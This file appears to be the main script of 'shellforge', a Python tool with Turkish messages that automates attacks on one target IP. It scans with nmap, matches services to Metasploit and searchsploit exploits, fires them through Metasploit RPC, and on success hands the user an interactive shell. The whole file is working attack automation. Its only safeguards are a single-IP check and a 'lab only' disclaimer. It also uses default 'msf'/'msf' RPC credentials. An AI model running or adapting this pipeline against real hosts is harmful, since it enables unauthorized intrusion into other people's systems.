#!/usr/bin/env python3
"""shellforge -- autonomous lab-only exploitation pipeline.

Given a SINGLE target IP, shellforge runs recon -> match -> dry-run -> fire ->
verify, and on success drops the user straight into the obtained session.

AUTHORIZED LAB USE ONLY. shellforge keeps this at the tool level:

* exactly one IP address (no CIDR, ranges, lists or input files),
* no hardcoded targets and no internet-facing scan mode,
* Ctrl+C stops immediately and cleans up sessions it opened.
"""

from __future__ import annotations

import argparse
import ipaddress
import logging
import signal
import sys
from datetime import datetime
from pathlib import Path

import yaml

from core import executor as execmod
from core import matcher, recon, reporter
from core.colors import err, info, ok, paint, warn

LOG = logging.getLogger("shellforge")

BANNER = r"""
  _          _ _  __
 | |__  __ _| | |/ _|___ _ _ __ _ ___
 | '_ \/ _` | | |  _/ _ \ '_/ _` / -_)
 |_.__/\__,_|_|_|_| \___/_| \__, \___|   shellforge
                            |___/        yalnizca yetkili lab kullanimi
"""


class _ColorLogFormatter(logging.Formatter):
    """Logging formatter that colours console lines by severity."""

    _LEVEL = {
        logging.DEBUG: "dim",
        logging.INFO: "info",
        logging.WARNING: "warn",
        logging.ERROR: "err",
        logging.CRITICAL: "err",
    }

    def format(self, record: logging.LogRecord) -> str:
        msg = super().format(record)
        kind = self._LEVEL.get(record.levelno)
        return paint(kind, msg) if kind else msg


def setup_logging(target: str, reports_dir: Path, to_file: bool) -> Path | None:
    """Configure console logging (coloured); add a logfile only when requested."""
    fmt = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
    stream = logging.StreamHandler(sys.stdout)
    stream.setFormatter(_ColorLogFormatter(fmt))
    handlers: list[logging.Handler] = [stream]

    logfile: Path | None = None
    if to_file:
        reports_dir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        logfile = reports_dir / f"shellforge_{target.replace(':', '_')}_{ts}.log"
        fh = logging.FileHandler(logfile, encoding="utf-8")
        fh.setFormatter(logging.Formatter(fmt))  # plain text in the logfile
        handlers.append(fh)

    logging.basicConfig(level=logging.INFO, handlers=handlers)
    if logfile:
        LOG.info("Günlük dosyası: %s", logfile)
    return logfile


def validate_single_ip(value: str) -> str:
    """Accept exactly one IP address. Reject CIDR, ranges, lists, files.

    Raises:
        argparse.ArgumentTypeError: On anything that is not a single IP.
    """
    raw = value.strip()
    for bad, label in (("/", "CIDR"), (",", "liste"), (" ", "liste"), ("-", "aralık")):
        if bad in raw:
            raise argparse.ArgumentTypeError(
                f"Tek bir IP adresi girilmeli; {label} girişi ('{raw}') kabul "
                "edilmez. shellforge tek hedefli, yalnızca lab içindir."
            )
    try:
        ip = ipaddress.ip_address(raw)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(
            f"'{raw}' geçerli bir IP adresi değil: {exc}"
        ) from exc
    return str(ip)


def prompt_for_target() -> str | None:
    """Interactively ask the user for the single target IP.

    Loops until a valid single IP is entered. Returns ``None`` if the user
    cancels (empty input + Ctrl+C / EOF).
    """
    print(BANNER)
    print("Otonom lab exploit zinciri. Tek hedef, yalnızca yetkili lab.\n")
    try:
        while True:
            raw = input(info("[?] Kurban IP (tek adres): ")).strip()
            if not raw:
                print("    (Boş. Çıkmak için Ctrl+C.)")
                continue
            try:
                return validate_single_ip(raw)
            except argparse.ArgumentTypeError as exc:
                print(err(f"    [!] {exc}\n"))
    except (EOFError, KeyboardInterrupt):
        print()
        return None


def load_config(path: str | Path) -> dict:
    """Load YAML config, or exit with a hint if it is missing."""
    p = Path(path)
    if not p.exists():
        print(
            err(f"[!] Yapılandırma dosyası '{p}' bulunamadı. Önce şablonu kopyala:")
            + f"\n      cp config.yaml.example {p}\n",
            file=sys.stderr,
        )
        sys.exit(2)
    with p.open("r", encoding="utf-8") as fh:
        return yaml.safe_load(fh) or {}


def detect_lhost(target: str) -> str:
    """Detect the local IP the kernel would use to reach ``target``.

    Opens a UDP socket toward the target (no packets are actually sent) and
    reads back the chosen source address. Falls back to 127.0.0.1 on failure.
    """
    import socket

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 9))
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


def _stop_proc(proc) -> None:
    """Terminate a process we started, forcing a kill if it does not stop."""
    try:
        proc.terminate()
        proc.wait(timeout=5)
    except Exception:  # noqa: BLE001 - best-effort teardown
        try:
            proc.kill()
        except Exception:  # noqa: BLE001
            pass


def _launch_window_attach(msf_cfg: dict, sid: int) -> bool:
    """Open a new gnome-terminal window that attaches to session ``sid``.

    Returns True if the window was launched, False if gnome-terminal is not
    available (caller then falls back to in-process attach).
    """
    import shutil
    import subprocess

    term = shutil.which("gnome-terminal")
    if term is None:
        return False

    script = Path(__file__).resolve().parent / "attach.py"
    cmd = [
        "python3", str(script),
        "--sid", str(sid),
        "--host", str(msf_cfg.get("host", "127.0.0.1")),
        "--port", str(msf_cfg.get("port", 55553)),
        "--user", str(msf_cfg.get("user", "msf")),
        "--password", str(msf_cfg.get("password", "msf")),
    ]
    if not bool(msf_cfg.get("ssl", True)):
        cmd.append("--no-ssl")
    try:
        subprocess.Popen([term, "--", *cmd])
        return True
    except Exception:  # noqa: BLE001
        return False


def _write_report(target, recon_result, matches, attempts, reports_dir) -> tuple[str, str]:
    """Build and write JSON + Markdown reports; return the two paths."""
    if recon_result is None:
        return "", ""
    report = reporter.build_report(target, True, recon_result, matches, attempts)
    return reporter.write_reports(report, reports_dir)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="shellforge",
        description="Autonomous lab-only exploitation pipeline (single target).",
        epilog="AUTHORIZED LAB USE ONLY. You are responsible for having permission.",
    )
    parser.add_argument(
        "--target",
        default=None,
        help="A single target IP address (no CIDR/range/list/file). "
        "If omitted, shellforge asks for it interactively.",
    )
    parser.add_argument(
        "--config",
        default="config.yaml",
        help="Path to the YAML config file (default: config.yaml).",
    )
    parser.add_argument(
        "--rapor",
        action="store_true",
        help="Write JSON report + logfile (and raw nmap XML) to reports/. "
        "Off by default.",
    )
    parser.add_argument(
        "--pencere",
        action="store_true",
        help="On success, open the interactive session attach in a new "
        "gnome-terminal window instead of the current one.",
    )
    args = parser.parse_args(argv)

    # Resolve the target: from --target if given (validated here), otherwise
    # ask the user interactively.
    if args.target:
        print(BANNER)
        try:
            args.target = validate_single_ip(args.target)
        except argparse.ArgumentTypeError as exc:
            parser.error(str(exc))
    else:
        resolved = prompt_for_target()
        if resolved is None:
            print(err("[!] Hedef girilmedi. Çıkılıyor."))
            return 1

        args.target = resolved

    config = load_config(args.config)
    reports_dir = Path("reports")
    setup_logging(args.target, reports_dir, to_file=args.rapor)

    LOG.info("Hedef: %s", args.target)

    # Auto-detect LHOST so the user never has to edit config for a basic run.
    handler = config.setdefault("handler", {})
    lhost = str(handler.get("lhost") or "").strip()
    if lhost.lower() in ("", "auto"):
        detected = detect_lhost(args.target)
        handler["lhost"] = detected
        LOG.info("LHOST otomatik belirlendi: %s", detected)
        print(info(f"[*] LHOST otomatik belirlendi: {detected}"))

    the_executor: execmod.Executor | None = None
    msf_proc = None  # msfrpcd process if shellforge started it

    def handle_sigint(signum, frame):  # noqa: ANN001 - signal handler signature
        LOG.warning("Ctrl+C alındı -- durduruluyor ve temizleniyor.")
        print(err("\n[!] Kesildi. shellforge'un açtığı oturumlar temizleniyor..."))
        if the_executor is not None:
            the_executor.cleanup()
        if msf_proc is not None:
            _stop_proc(msf_proc)
        sys.exit(130)

    signal.signal(signal.SIGINT, handle_sigint)

    recon_result = None
    matches: list = []
    attempts: list = []

    try:
        # --- 1. RECON -------------------------------------------------------
        recon_cfg = config.get("recon", {})
        recon_result = recon.run_recon(
            target=args.target,
            nmap_arguments=recon_cfg.get("nmap_arguments", "-sV -Pn"),
            timeout=int(recon_cfg.get("timeout", 300)),
            reports_dir=reports_dir,
            save_xml=args.rapor,
        )
        open_services = recon_result.open_services()
        if not open_services:
            print(warn("[!] Açık servis bulunamadı. Yapılacak bir şey yok."))
            if args.rapor:
                _write_report(args.target, recon_result, matches, attempts, reports_dir)
            return 0

        # --- 2. CONNECT (auto-start msfrpcd if needed) + MATCH -------------
        msf_cfg = config.get("msfrpc", {})
        print(info("[*] Metasploit RPC'ye bağlanılıyor (çalışmıyorsa otomatik başlatılır)..."))
        client, msf_proc = execmod.connect_or_start(
            host=msf_cfg.get("host", "127.0.0.1"),
            port=int(msf_cfg.get("port", 55553)),
            user=msf_cfg.get("user", "msf"),
            password=msf_cfg.get("password", "msf"),
            ssl=bool(msf_cfg.get("ssl", True)),
        )
        if msf_proc is not None:
            print(info(f"[*] msfrpcd otomatik başlatıldı (PID {msf_proc.pid})."))

        matches = matcher.match_services(
            open_services,
            msf_client=client,
            use_searchsploit=config.get("searchsploit", {}).get("enabled", True),
        )
        candidates = matcher.flatten_candidates(matches)
        if not candidates:
            print(warn("[!] Denenebilir Metasploit adayı bulunamadı."))
            if args.rapor:
                _write_report(args.target, recon_result, matches, attempts, reports_dir)
            if msf_proc is not None:
                _stop_proc(msf_proc)
            return 0

        print(info(f"[*] {len(candidates)} aday modül sıraya alındı (en güvenilir önce)."))

        # --- 3-5. DRY-RUN + FIRE + VERIFY ----------------------------------
        the_executor = execmod.Executor(client, args.target, config)
        attempts = the_executor.run(candidates)

        # --- 6. SHELL DELIVERY ---------------------------------------------
        success = next((a for a in attempts if getattr(a, "success", False)), None)
        if success is not None:
            sid = success.session_id
            print(ok(f"\n[+] SHELL ALINDI! Oturum {sid} ({success.session_type or '?'})."))
            if args.pencere:
                if _launch_window_attach(msf_cfg, sid):
                    print(info("[*] Oturum yeni bir gnome-terminal penceresinde açıldı."))
                else:
                    print(warn("[*] gnome-terminal yok; bu pencerede bağlanılıyor."))
                    the_executor.interact(sid)
            else:
                the_executor.interact(sid)
        else:
            print(warn("\n[-] Shell alınamadı. Tüm adaylar denendi."))

    except execmod.MsfConnectionError as exc:
        LOG.error("%s", exc)
        print(err(f"\n[!] {exc}"))
        if args.rapor:
            _write_report(args.target, recon_result, matches, attempts, reports_dir)
        return 3
    except Exception as exc:  # noqa: BLE001 - top-level guard
        LOG.exception("Beklenmeyen hata: %s", exc)
        print(err(f"[!] Beklenmeyen hata: {exc}"))
        if args.rapor:
            _write_report(args.target, recon_result, matches, attempts, reports_dir)
        if msf_proc is not None:
            _stop_proc(msf_proc)
        return 1

    succeeded = any(getattr(a, "success", False) for a in attempts)

    # Optional report (off by default).
    if args.rapor:
        json_path, md_path = _write_report(
            args.target, recon_result, matches, attempts, reports_dir
        )
        print(info(f"[*] JSON rapor: {json_path}"))
        print(info(f"[*] MD rapor:   {md_path}"))

    # If shellforge started msfrpcd: keep it alive when a session landed so the
    # shell survives (per design); otherwise shut it back down.
    if msf_proc is not None:
        if succeeded:
            print(info(f"[*] msfrpcd açık bırakıldı (PID {msf_proc.pid}) — oturum canlı."))
            print(info(f"    Durdurmak için: kill {msf_proc.pid}"))
        else:
            _stop_proc(msf_proc)
            print(info("[*] Otomatik başlatılan msfrpcd kapatıldı."))

    return 0 if succeeded else 4


if __name__ == "__main__":
    raise SystemExit(main())
